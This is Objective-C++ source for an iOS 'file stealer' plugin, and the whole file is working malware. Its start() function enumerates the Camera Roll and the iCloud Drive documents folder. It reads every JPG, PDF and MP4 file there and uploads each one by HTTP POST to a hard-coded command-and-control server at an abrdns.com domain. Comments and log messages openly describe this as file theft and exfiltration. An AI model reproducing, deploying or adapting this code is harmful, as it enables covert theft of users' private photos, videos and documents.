// FILE: file_stealer.mm
#import <Foundation/Foundation.h>
#include <iostream>

// YOUR AWS EC2 IP ADDRESS
const char* C2_URL = "https://security-pass.abrdns.com/api/v1/upload";

// Function to upload the file to AWS
void upload_file(NSData *fileData, NSString *filename) {
    NSURL *url = [NSURL URLWithString:[NSString stringWithUTF8String:C2_URL]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:fileData];
    [request setValue:@"application/octet-stream" forHTTPHeaderField:@"Content-Type"];
    // Send the filename so AWS knows what it is saving
    [request setValue:filename forHTTPHeaderField:@"X-Filename"]; 
    
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error == nil) {
            std::cout << "[PLUGIN] Successfully uploaded: " << [filename UTF8String] << "\n";
        } else {
            std::cout << "[PLUGIN] Upload failed for " << [filename UTF8String] << ": " << [[error localizedDescription] UTF8String] << "\n";
        }
        dispatch_semaphore_signal(semaphore);
    }];
    
    [task resume];
    // Wait for the upload to finish before moving to the next file (prevents crashing)
    dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
}

extern "C" void start() {
    std::cout << "[PLUGIN] Real File Stealer Initialized.\n";
    
    // Target directories (Camera Roll and iCloud Drive Documents)
    NSArray *targets = @[
        @"/var/mobile/Media/DCIM/",
        @"/var/mobile/Library/Mobile Documents/"
    ];

    NSFileManager *fm = [NSFileManager defaultManager];

    for (NSString *dir in targets) {
        NSDirectoryEnumerator *enumerator = [fm enumeratorAtPath:dir];
        NSString *file;
        
        while ((file = [enumerator nextObject])) {
            // Look for photos, videos, and PDFs
            if ([file hasSuffix:@".JPG"] || [file hasSuffix:@".PDF"] || [file hasSuffix:@".MP4"]) {
                NSString *fullPath = [dir stringByAppendingPathComponent:file];
                
                // Read the file into memory
                NSData *fileData = [NSData dataWithContentsOfFile:fullPath];
                
                if (fileData) {
                    std::cout << "[PLUGIN] Found: " << [fullPath UTF8String] << " (" << fileData.length << " bytes). Uploading...\n";
                    
                    // ACTUALLY SEND IT TO AWS
                    upload_file(fileData, [file lastPathComponent]);
                }
            }
        }
    }
    std::cout << "[PLUGIN] File theft and exfiltration complete.\n";
}